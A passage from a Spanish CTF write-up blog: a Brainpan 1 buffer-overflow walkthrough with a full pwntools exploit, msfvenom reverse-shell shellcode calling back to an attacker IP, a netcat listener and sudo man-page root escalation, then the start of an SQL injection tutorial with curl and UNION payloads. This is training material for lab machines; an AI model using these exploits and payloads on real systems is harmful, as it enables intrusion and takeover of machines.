\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; Todos estos bytes vamos a ponerlos en el script de python para que se incorporen despuÃ©s del EIP, de momento el EIP le vamos a dar de valor \u0026ldquo;42424242\u0026rdquo; (BBBB). Esto queda tal que asi:\nfrom pwn import * offset = 524 junk = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;B\u0026#34; * 4 after_eip = (b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) payload = junk + eip + after_eip host, port = \u0026#34;192.168.88.12\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Ahora al hacer Click derecho en el ESP arriba a la derecha \u0026gt; Follow in Dump, vemos donde empiezan los bytes que hemos puesto despuÃ©s del EIP, y a la izquierda podemos ver la direcciÃ³n de memoria donde empiezan los bytes de la comprobaciÃ³n de los badchars\n0022F918 41414141 AAAA 0022F91C 41414141 AAAA 0022F920 41414141 AAAA 0022F924 41414141 AAAA 0022F928 41414141 AAAA 0022F92C 42424242 BBBB 0022F930 04030201 \u0001\u0002\u0003\u0004 0022F934 08070605 \u0005\u0006\u0007\u0008 0022F938 0C0B0A09 ..\u000b. 0022F93C 100F0E0D .\u000e\u000f\u0010 0022F940 14131211 \u0011\u0012\u0013\u0014 0022F944 18171615 \u0015\u0016\u0017\u0018 0022F948 1C1B1A19 \u0019\u001a\u001b\u001c 0022F94C 201F1E1D \u001d\u001e\u001f 0022F950 24232221 !\u0026#34;#$ 0022F954 28272625 %\u0026amp;\u0026#39;( 0022F958 2C2B2A29 )*+, 0022F95C 302F2E2D -./0 0022F960 34333231 1234 Nos podemos fijar en que byte no sale representado de forma correcta o usar el siguiente comando de mona\n!mona compare -f C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin -a 0022F930 0BADF00D [+] Fetched 255 bytes successfully from C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin 0BADF00D - Comparing 1 location(s) 0BADF00D Comparing bytes from file with memory : 0022F930 [+] Comparing with memory at location : 0x0022f930 (Stack) 0022F930 !!! Hooray, normal shellcode unmodified !!! 0022F930 Bytes omitted from input: 00 DespuÃ©s de ejecutar el comando se abre una ventanita la cual muestra los badchars encontrados, en este caso no ha encontrado ninguno. AsÃ­ que a la hora de crear el shellcode simplemente excluiremos los \\x00\nProtecciones Con el siguiente comando podemos ver los las protecciones del binario\n!mona modules 0BADF00D ---------------------------------------------------------------------------------------------------------------------------------------------- 0BADF00D Module info : 0BADF00D ---------------------------------------------------------------------------------------------------------------------------------------------- 0BADF00D Base | Top | Size | Rebase | SafeSEH | ASLR | CFG | NXCompat | OS Dll | Version, Modulename \u0026amp; Path, DLLCharacteristics 0BADF00D ---------------------------------------------------------------------------------------------------------------------------------------------- .... 0BADF00D 0x76df0000 | 0x76ec4000 | 0x000d4000 | True | True | True | False | True | True | 6.1.7600.16385 [kernel32.dll] (C:\\Windows\\system32\\kernel32.dll) 0x140 0BADF00D 0x31170000 | 0x31176000 | 0x00006000 | False | False | False | False | False | False | -1.0- [brainpan.exe] (C:\\Users\\arnau\\Downloads\\brainpan.exe) 0x0 0BADF00D 0x76960000 | 0x76a0c000 | 0x000ac000 | True | True | True | False | True | True | 7.0.7600.16385 [msvcrt.dll] (C:\\Windows\\system32\\msvcrt.dll) 0x140 .... 0BADF00D ----------------------------------------------------------------------------------------------------------------------------------------- En la fila del brainpan.exe sale todo en false.\nJMP ESP Ahora toca encontrar la direcciÃ³n del JMP ESP. Para encontrarlo necesitamos saber el opcode de JMP ESP\n\u0026gt; /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm \u0026gt; jmp ESP 00000000 FFE4 jmp esp nasm \u0026gt; El opcode de JMP ESP es FFE4, sabiendo esto, podemos buscar con mona la direcciÃ³n del JMP ESP\n!mona find -s \u0026#34;\\xFF\\xE4\u0026#34; -m brainpan.exe 712F3 0x311712f3 : \u0026#34;\\xFF\\xE4\u0026#34; | {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\\Users\\arnau\\Downloads\\brainpan.exe), 0x0 La direcciÃ³n del JMP ESP es: 0x311712f3\nShellcode Por Ãºltimo vamos a desarrollar el shellcode el cual nos enviara una reverse shell a nuestra mÃ¡quina de atacante. Para crear el shellcode usaremos msfvenom de la siguiente forma:\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.88.5 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f py -b \u0026#34;\\x00\u0026#34; EXITFUNC=thread buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xba\\x0c\\xa9\\x71\\x87\\xdb\\xde\\xd9\\x74\\x24\\xf4\\x5d\u0026#34; buf += b\u0026#34;\\x33\\xc9\\xb1\\x52\\x31\\x55\\x12\\x83\\xc5\\x04\\x03\\x59\u0026#34; buf += b\u0026#34;\\xa7\\x93\\x72\\x9d\\x5f\\xd1\\x7d\\x5d\\xa0\\xb6\\xf4\\xb8\u0026#34; buf += b\u0026#34;\\x91\\xf6\\x63\\xc9\\x82\\xc6\\xe0\\x9f\\x2e\\xac\\xa5\\x0b\u0026#34; buf += b\u0026#34;\\xa4\\xc0\\x61\\x3c\\x0d\\x6e\\x54\\x73\\x8e\\xc3\\xa4\\x12\u0026#34; buf += b\u0026#34;\\x0c\\x1e\\xf9\\xf4\\x2d\\xd1\\x0c\\xf5\\x6a\\x0c\\xfc\\xa7\u0026#34; buf += b\u0026#34;\\x23\\x5a\\x53\\x57\\x47\\x16\\x68\\xdc\\x1b\\xb6\\xe8\\x01\u0026#34; buf += b\u0026#34;\\xeb\\xb9\\xd9\\x94\\x67\\xe0\\xf9\\x17\\xab\\x98\\xb3\\x0f\u0026#34; buf += b\u0026#34;\\xa8\\xa5\\x0a\\xa4\\x1a\\x51\\x8d\\x6c\\x53\\x9a\\x22\\x51\u0026#34; buf += b\u0026#34;\\x5b\\x69\\x3a\\x96\\x5c\\x92\\x49\\xee\\x9e\\x2f\\x4a\\x35\u0026#34; buf += b\u0026#34;\\xdc\\xeb\\xdf\\xad\\x46\\x7f\\x47\\x09\\x76\\xac\\x1e\\xda\u0026#34; buf += b\u0026#34;\\x74\\x19\\x54\\x84\\x98\\x9c\\xb9\\xbf\\xa5\\x15\\x3c\\x6f\u0026#34; buf += b\u0026#34;\\x2c\\x6d\\x1b\\xab\\x74\\x35\\x02\\xea\\xd0\\x98\\x3b\\xec\u0026#34; buf += b\u0026#34;\\xba\\x45\\x9e\\x67\\x56\\x91\\x93\\x2a\\x3f\\x56\\x9e\\xd4\u0026#34; buf += b\u0026#34;\\xbf\\xf0\\xa9\\xa7\\x8d\\x5f\\x02\\x2f\\xbe\\x28\\x8c\\xa8\u0026#34; buf += b\u0026#34;\\xc1\\x02\\x68\\x26\\x3c\\xad\\x89\\x6f\\xfb\\xf9\\xd9\\x07\u0026#34; buf += b\u0026#34;\\x2a\\x82\\xb1\\xd7\\xd3\\x57\\x15\\x87\\x7b\\x08\\xd6\\x77\u0026#34; buf += b\u0026#34;\\x3c\\xf8\\xbe\\x9d\\xb3\\x27\\xde\\x9e\\x19\\x40\\x75\\x65\u0026#34; buf += b\u0026#34;\\xca\\xaf\\x22\\x3d\\x0f\\x58\\x31\\xbd\\x0e\\x23\\xbc\\x5b\u0026#34; buf += b\u0026#34;\\x7a\\x43\\xe9\\xf4\\x13\\xfa\\xb0\\x8e\\x82\\x03\\x6f\\xeb\u0026#34; buf += b\u0026#34;\\x85\\x88\\x9c\\x0c\\x4b\\x79\\xe8\\x1e\\x3c\\x89\\xa7\\x7c\u0026#34; buf += b\u0026#34;\\xeb\\x96\\x1d\\xe8\\x77\\x04\\xfa\\xe8\\xfe\\x35\\x55\\xbf\u0026#34; buf += b\u0026#34;\\x57\\x8b\\xac\\x55\\x4a\\xb2\\x06\\x4b\\x97\\x22\\x60\\xcf\u0026#34; buf += b\u0026#34;\\x4c\\x97\\x6f\\xce\\x01\\xa3\\x4b\\xc0\\xdf\\x2c\\xd0\\xb4\u0026#34; buf += b\u0026#34;\\x8f\\x7a\\x8e\\x62\\x76\\xd5\\x60\\xdc\\x20\\x8a\\x2a\\x88\u0026#34; buf += b\u0026#34;\\xb5\\xe0\\xec\\xce\\xb9\\x2c\\x9b\\x2e\\x0b\\x99\\xda\\x51\u0026#34; buf += b\u0026#34;\\xa4\\x4d\\xeb\\x2a\\xd8\\xed\\x14\\xe1\\x58\\x0d\\xf7\\x23\u0026#34; buf += b\u0026#34;\\x95\\xa6\\xae\\xa6\\x14\\xab\\x50\\x1d\\x5a\\xd2\\xd2\\x97\u0026#34; buf += b\u0026#34;\\x23\\x21\\xca\\xd2\\x26\\x6d\\x4c\\x0f\\x5b\\xfe\\x39\\x2f\u0026#34; buf += b\u0026#34;\\xc8\\xff\\x6b\u0026#34; Falta juntarlo todo en el script\nfrom pwn import * from struct import pack offset = 524 junk = b\u0026#34;A\u0026#34; * offset eip = pack(\u0026#34;\u0026lt;I\u0026#34;, 0x311712f3) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xba\\x0c\\xa9\\x71\\x87\\xdb\\xde\\xd9\\x74\\x24\\xf4\\x5d\u0026#34; buf += b\u0026#34;\\x33\\xc9\\xb1\\x52\\x31\\x55\\x12\\x83\\xc5\\x04\\x03\\x59\u0026#34; buf += b\u0026#34;\\xa7\\x93\\x72\\x9d\\x5f\\xd1\\x7d\\x5d\\xa0\\xb6\\xf4\\xb8\u0026#34; buf += b\u0026#34;\\x91\\xf6\\x63\\xc9\\x82\\xc6\\xe0\\x9f\\x2e\\xac\\xa5\\x0b\u0026#34; buf += b\u0026#34;\\xa4\\xc0\\x61\\x3c\\x0d\\x6e\\x54\\x73\\x8e\\xc3\\xa4\\x12\u0026#34; buf += b\u0026#34;\\x0c\\x1e\\xf9\\xf4\\x2d\\xd1\\x0c\\xf5\\x6a\\x0c\\xfc\\xa7\u0026#34; buf += b\u0026#34;\\x23\\x5a\\x53\\x57\\x47\\x16\\x68\\xdc\\x1b\\xb6\\xe8\\x01\u0026#34; buf += b\u0026#34;\\xeb\\xb9\\xd9\\x94\\x67\\xe0\\xf9\\x17\\xab\\x98\\xb3\\x0f\u0026#34; buf += b\u0026#34;\\xa8\\xa5\\x0a\\xa4\\x1a\\x51\\x8d\\x6c\\x53\\x9a\\x22\\x51\u0026#34; buf += b\u0026#34;\\x5b\\x69\\x3a\\x96\\x5c\\x92\\x49\\xee\\x9e\\x2f\\x4a\\x35\u0026#34; buf += b\u0026#34;\\xdc\\xeb\\xdf\\xad\\x46\\x7f\\x47\\x09\\x76\\xac\\x1e\\xda\u0026#34; buf += b\u0026#34;\\x74\\x19\\x54\\x84\\x98\\x9c\\xb9\\xbf\\xa5\\x15\\x3c\\x6f\u0026#34; buf += b\u0026#34;\\x2c\\x6d\\x1b\\xab\\x74\\x35\\x02\\xea\\xd0\\x98\\x3b\\xec\u0026#34; buf += b\u0026#34;\\xba\\x45\\x9e\\x67\\x56\\x91\\x93\\x2a\\x3f\\x56\\x9e\\xd4\u0026#34; buf += b\u0026#34;\\xbf\\xf0\\xa9\\xa7\\x8d\\x5f\\x02\\x2f\\xbe\\x28\\x8c\\xa8\u0026#34; buf += b\u0026#34;\\xc1\\x02\\x68\\x26\\x3c\\xad\\x89\\x6f\\xfb\\xf9\\xd9\\x07\u0026#34; buf += b\u0026#34;\\x2a\\x82\\xb1\\xd7\\xd3\\x57\\x15\\x87\\x7b\\x08\\xd6\\x77\u0026#34; buf += b\u0026#34;\\x3c\\xf8\\xbe\\x9d\\xb3\\x27\\xde\\x9e\\x19\\x40\\x75\\x65\u0026#34; buf += b\u0026#34;\\xca\\xaf\\x22\\x3d\\x0f\\x58\\x31\\xbd\\x0e\\x23\\xbc\\x5b\u0026#34; buf += b\u0026#34;\\x7a\\x43\\xe9\\xf4\\x13\\xfa\\xb0\\x8e\\x82\\x03\\x6f\\xeb\u0026#34; buf += b\u0026#34;\\x85\\x88\\x9c\\x0c\\x4b\\x79\\xe8\\x1e\\x3c\\x89\\xa7\\x7c\u0026#34; buf += b\u0026#34;\\xeb\\x96\\x1d\\xe8\\x77\\x04\\xfa\\xe8\\xfe\\x35\\x55\\xbf\u0026#34; buf += b\u0026#34;\\x57\\x8b\\xac\\x55\\x4a\\xb2\\x06\\x4b\\x97\\x22\\x60\\xcf\u0026#34; buf += b\u0026#34;\\x4c\\x97\\x6f\\xce\\x01\\xa3\\x4b\\xc0\\xdf\\x2c\\xd0\\xb4\u0026#34; buf += b\u0026#34;\\x8f\\x7a\\x8e\\x62\\x76\\xd5\\x60\\xdc\\x20\\x8a\\x2a\\x88\u0026#34; buf += b\u0026#34;\\xb5\\xe0\\xec\\xce\\xb9\\x2c\\x9b\\x2e\\x0b\\x99\\xda\\x51\u0026#34; buf += b\u0026#34;\\xa4\\x4d\\xeb\\x2a\\xd8\\xed\\x14\\xe1\\x58\\x0d\\xf7\\x23\u0026#34; buf += b\u0026#34;\\x95\\xa6\\xae\\xa6\\x14\\xab\\x50\\x1d\\x5a\\xd2\\xd2\\x97\u0026#34; buf += b\u0026#34;\\x23\\x21\\xca\\xd2\\x26\\x6d\\x4c\\x0f\\x5b\\xfe\\x39\\x2f\u0026#34; buf += b\u0026#34;\\xc8\\xff\\x6b\u0026#34; payload = junk + eip + b\u0026#34;\\x90\u0026#34; * 16 + buf host, port = \u0026#34;192.168.88.12\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Repasando el script:\nPrimero se define el offset que es la cantidad de caracteres que ponemos para llegar hasta el eip, en el eip ponemos la direcciÃ³n del JMP ESP para que salte al ESP. DespuÃ©s del eip ponemos 16 veces \u0026ldquo;\\x90\u0026rdquo; y por Ãºltimo el shellcode.\nÂ¿Por quÃ© ponemos \\x90 antes del shellcode?\nLa memoria puede moverse un poco durante la ejecuciÃ³n del programa, asÃ­ que no sabemos exactamente en quÃ© direcciÃ³n comenzarÃ¡ el shellcode en el bÃºfer. El NOP-sled es una forma de lidiar con esto.\nUn NOP-sled es una secuencia de instrucciones NOP (sin operaciÃ³n) destinadas a \u0026ldquo;deslizar\u0026rdquo; el flujo de ejecuciÃ³n de instrucciones de la CPU a la siguiente direcciÃ³n de memoria. Dondequiera que la direcciÃ³n de retorno aterrice en el NOP-sled, se deslizarÃ¡ a lo largo del bÃºfer hasta que alcance el inicio del shellcode\nSolo falta ponernos en escucha y Â¡ejecutar el script!\n\u0026gt; rlwrap nc -nlvp 443 listening on [any] 443 ... connect to [192.168.88.5] from (UNKNOWN) [192.168.88.12] 49190 Microsoft Windows [Versiï¿½n 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. Escalada de privilegios Dentro de la carpeta del directorio personal de puck vemos este archivo\n#!/bin/bash # run brainpan.exe if it stops lsof -i:9999 if [[ $? -eq 1 ]]; then pid=`ps aux | grep brainpan.exe | grep -v grep` if [[ ! -z $pid ]]; then kill -9 $pid killall wineserver killall winedevice.exe fi /usr/bin/wine /home/puck/web/bin/brainpan.exe \u0026amp; fi # run SimpleHTTPServer if it stops lsof -i:10000 if [[ $? -eq 1 ]]; then pid=`ps aux | grep SimpleHTTPServer | grep -v grep` if [[ ! -z $pid ]]; then kill -9 $pid fi cd /home/puck/web /usr/bin/python -m SimpleHTTPServer 10000 fi Esto es un script en bash esto significa que esto es un linux, asÃ­ que vamos a cambiar el payload para linux.\n\u0026gt; msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.88.5 LPORT=443 -b \u0026#34;\\x00\u0026#34; -f py shellcode buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xda\\xdb\\xbf\\x5f\\xa4\\xa1\\x30\\xd9\\x74\\x24\\xf4\\x5a\u0026#34; buf += b\u0026#34;\\x29\\xc9\\xb1\\x12\\x31\\x7a\\x17\\x03\\x7a\\x17\\x83\\xb5\u0026#34; buf += b\u0026#34;\\x58\\x43\\xc5\\x78\\x7a\\x73\\xc5\\x29\\x3f\\x2f\\x60\\xcf\u0026#34; buf += b\u0026#34;\\x36\\x2e\\xc4\\xa9\\x85\\x31\\xb6\\x6c\\xa6\\x0d\\x74\\x0e\u0026#34; buf += b\u0026#34;\\x8f\\x08\\x7f\\x66\\xd0\\x43\\x27\\x73\\xb8\\x91\\xd8\\x7a\u0026#34; buf += b\u0026#34;\\x83\\x1f\\x39\\xcc\\x95\\x4f\\xeb\\x7f\\xe9\\x73\\x82\\x9e\u0026#34; buf += b\u0026#34;\\xc0\\xf4\\xc6\\x08\\xb5\\xdb\\x95\\xa0\\x21\\x0b\\x75\\x52\u0026#34; buf += b\u0026#34;\\xdb\\xda\\x6a\\xc0\\x48\\x54\\x8d\\x54\\x65\\xab\\xce\u0026#34; Ahora dentro con sudo -lvemos que podemos ejecutar /home/anansi/bin/anansi_util como root sin contraseÃ±a.\npuck@brainpan:/home/puck$ sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util Este script tiene 3 opciones\npuck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [action] Where [action] is one of: - network - proclist - manual [command] Network Ejecuta un ifconfig\npuck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 16436 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000 link/ether 08:00:27:c3:40:1b brd ff:ff:ff:ff:ff:ff inet 192.168.88.10/24 brd 192.168.88.255 scope global eth0 inet6 fe80::a00:27ff:fec3:401b/64 scope link valid_lft forever preferred_lft forever Proclist puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist top - 10:15:24 up 15 min, 0 users, load average: 0.00, 0.00, 0.00 Tasks: 77 total, 1 running, 76 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.0 us, 0.1 sy, 0.0 ni, 99.9 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem: 248936 total, 136380 used, 112556 free, 25352 buffers KiB Swap: 520188 total, 0 used, 520188 free, 77192 cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1 root 20 0 3492 1860 1280 S 0.0 0.7 0:00.24 init 2 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:00.03 ksoftirqd/0 4 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0 6 root rt 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 7 root rt 0 0 0 0 S 0.0 0.0 0:00.00 watchdog/0 8 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 cpuset 9 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 khelper 10 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 11 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 12 root 20 0 0 0 0 S 0.0 0.0 0:00.00 sync_supers 13 root 20 0 0 0 0 S 0.0 0.0 0:00.00 bdi-default 14 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kintegrityd 15 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kblockd 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 ata_sff 17 root 20 0 0 0 0 S 0.0 0.0 0:00.00 khubd 18 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 md Manual Muestra el manual de un comando\nsudo /home/anansi/bin/anansi_util manual /bin/bash El manual que muestra parece que es el mismo que man, asÃ­ que si ponemos lo siguiente dentro del manual, nos convertimos en root\n!/bin/bash MÃ¡quina resuelta\n","date":"2024-02-09","id":36,"permalink":"/writeups/vulnhub/brainpan-1/","summary":"En esta mÃ¡quina vamos a practicar el BoF (Buffer Overflow) mÃ¡s tÃ­pico que suele caer en certificaciones como el eCPPT o el antiguo OSCP","tags":["CTF","BoF"],"title":"Brainpan 1"},{"content":"","date":"2024-01-08","id":37,"permalink":"/ctf/picoctf/binaryexplotation-copy/","summary":"","tags":[],"title":"Binary Explotation"},{"content":"","date":"2024-01-08","id":38,"permalink":"/ctf/caixabankk/forense/","summary":"","tags":[],"title":"Forense"},{"content":" Â¿QuÃ© es una SQLI? MySQL InyecciÃ³n Union EnumeraciÃ³n bases de datos EnumeraciÃ³n de las tablas Columnas Data Subida de archivos Booleana Base de datos Tablas Columnas Data Mas informaciÃ³n relevante Basada en tiempo a ciegas Base de datos Tables Columns Data Mas informaciÃ³n relevante Â¿QuÃ© es una SQLI? Como dicen las siglas SQL Injection (InyecciÃ³n SQL), consiste en inyectar instrucciones SQL dentro de una query SQL, mediante la entrada o modificaciones de datos desde el cliente hacia la aplicaciÃ³n intencionada. Por ejemplo un formulario, un panel de inicio de sesiÃ³n, comentarios, etc\u0026hellip;\nVamos a imaginarnos un ejemplo, tenemos una web que nos da la informaciÃ³n del usuario que le mandamos por get\n\u0026gt; curl -s \u0026#34;localhost/index.php?nombre=joan\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Vamos a analizar el cÃ³digo para ver como estÃ¡ hecho.\n$nombre = $_GET[\u0026#39;nombre\u0026#39;]; $query = \u0026#34;SELECT * FROM mi_tabla WHERE nombre = \u0026#39;$nombre\u0026#39;\u0026#34;; El servidor web recibe por GET el contenido que se manda por el parÃ¡metro nombre y mete directamente nuestro input a la query SQL, sin validar si realmente le estamos pasando un nombre, asÃ­ que esto lo hace vulnerable a una SQL Injection.\n\u0026gt; curl -s \u0026#34;localhost/index.php?nombre=joan\u0026#39;\u0026#34; Error en la consulta: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;\u0026#39;joan\u0026#39;\u0026#39;\u0026#39; at line 1 Ha saltado un error en la consulta SQL, en el mensaje de error especifican que concretamente ha sido en \u0026lsquo;\u0026lsquo;\u0026lsquo;joan\u0026rsquo;\u0026rsquo;\u0026rsquo;\u0026rsquo;. Esto es porque hemos aÃ±adido una comilla la cual nunca se ha cerrado y ha quedado colgada lo que ha causado un error. AsÃ­ es como a quedado la query con la comilla que hemos aÃ±adido.\nSELECT * FROM mi_tabla WHERE nombre = \u0026#39;joan\u0026#39;\u0026#39; Ahora todo lo que pongamos despuÃ©s de la comilla se va a interpretar como instrucciones sql y para que no de problemas la comilla que se queda colgada, la podemos comentar con \u0026lsquo;\u0026ndash; -\u0026rsquo;\nSELECT * FROM mi_tabla WHERE nombre = \u0026#39;joan\u0026#39; sleep(5) -- -\u0026#39; Para entenderlo mejor, os comparto un ejemplo hecho con python, ya que python es mÃ¡s fÃ¡cil de entender\nCuando le ponemos una comilla de mÃ¡s da error\n\u0026gt;\u0026gt;\u0026gt; name = \u0026#34;Joan\u0026#34;\u0026#34; File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1 name = \u0026#34;Joan\u0026#34;\u0026#34; ^ SyntaxError: unterminated string literal (detected at line 1) Si comentamos la comilla ya no da error\n\u0026gt;\u0026gt;\u0026gt; name = \u0026#34;Joan\u0026#34; #\u0026#34; Ahora el contenido que pongamos despuÃ©s de la comilla se va a interpretar como instrucciones y no como texto\n\u0026gt;\u0026gt;\u0026gt; name = \u0026#34;joan\u0026#34;; print(\u0026#34;Hola\u0026#34;) #\u0026#34; Hola MySQL InyecciÃ³n Union Laboratorio\nPara la explicaciÃ³n se va a usar el laboratorio 1:\nDescarga el laboratorio\nDescomprÃ­melo y entra a la carpeta\nunzip lab1.zip cd lab1 Despliega el contenedor\ndocker-compose up --build Una vez tenemos localizada la SQL Injection, en el caso del laboratorio 1 es el parÃ¡metro nombre, vamos a llevar a cabo el tipo de inyecciÃ³n union.\nPrimero de todo necesitamos saber el nÃºmero de columnas que tiene la tabla que se estÃ¡ usando. Para localizarlas vamos a usar la funcion \u0026lsquo;order\u0026rsquo; la cual nos permite ordenar las columnas basÃ¡ndonos en la columna que le especificamos, si le especificamos un nÃºmero de columnas que no exista va a dar error, jugando con esto podemos encontrar el nÃºmero de columnas\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; order by 3-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; order by 4-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Error en la consulta: Unknown column \u0026#39;4\u0026#39; in \u0026#39;order clause\u0026#39; Ahora ya sabemos que la tabla tiene 3 columnas, porque \u0026lsquo;order by 3\u0026rsquo; no da error pero \u0026lsquo;order by 4\u0026rsquo; sÃ­. En el caso de que sea una tabla muy grande podemos usar herramientas para automatizar este paso.\n\u0026gt; wfuzz -c -t 20 -z range,1-5 \u0026#34;http://localhost/?nombre=joan\u0026#39;+order+by+FUZZ--+-\u0026#34; 000000001: 200 1 L 3 W 31 Ch \u0026#34;1\u0026#34; 000000003: 200 1 L 3 W 31 Ch \u0026#34;3\u0026#34; 000000002: 200 1 L 3 W 31 Ch \u0026#34;2\u0026#34; 000000004: 200 0 L 10 W 58 Ch \u0026#34;4\u0026#34; 000000005: 200 0 L 10 W 58 Ch \u0026#34;5\u0026#34; Vemos que cuando el nÃºmero de columna ya no existe cambia el tamaÃ±o de la respuesta.\nYa tenemos el nÃºmero de columnas asÃ­ que podemos empezar a usar union para concatenar datos. El payload es el siguiente\nunion select NULL,NULL,NULL-- - Hay que poner tantos NULL como columnas tenga la 